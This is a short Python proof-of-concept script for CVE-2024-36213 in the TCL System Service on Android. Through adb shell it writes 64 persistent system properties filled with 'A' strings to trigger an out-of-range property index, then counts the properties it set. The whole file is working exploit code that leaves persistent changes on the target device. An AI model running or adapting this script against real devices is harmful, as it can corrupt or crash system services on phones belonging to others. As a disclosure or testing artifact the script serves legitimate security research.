#!/usr/bin/env python3
"""CVE-2024-36213 — TCL System Service. System-property burst with an
out-of-range property index via the shell."""
import subprocess, sys

PROPS = "\n".join(f"setprop persist.tcl.poc.{i} {'A'*64}" for i in range(64))

def exploit(host=None):
    adb = ["adb"] + (["-s", host] if host else [])
    r = subprocess.run(adb + ["shell", PROPS], capture_output=True, text=True)
    print(r.stdout or r.stderr)
    r2 = subprocess.run(adb + ["shell", "getprop | grep persist.tcl.poc | wc -l"],
                        capture_output=True, text=True)
    print(f"[+] properties set: {r2.stdout.strip()}")

def main():
    exploit(sys.argv[1] if len(sys.argv) > 1 else None)

if __name__ == "__main__":
    main()
